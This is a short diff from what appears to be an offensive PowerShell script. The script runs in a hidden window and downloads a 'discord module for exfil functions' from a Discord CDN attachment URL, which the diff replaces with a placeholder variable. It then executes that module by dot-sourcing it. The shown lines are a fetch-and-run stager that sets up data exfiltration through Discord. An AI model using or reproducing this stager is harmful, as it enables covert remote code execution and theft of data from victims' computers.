@@ -29,9 +29,9 @@ PowerShell.exe -windowstyle hidden {
 
 
 
-
+  $cdnURL = "YOUR_CDN_URL"
   # Injecting discord module for exfil functions
-  Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/CHANNEL_ID/UNCLEAR?/FILENAME" -OutFile "$secret\discord.ps1"
+  Invoke-WebRequest -Uri "$cdnURL" -OutFile "$secret\discord.ps1"
   ."$secret\discord.ps1"
 
   
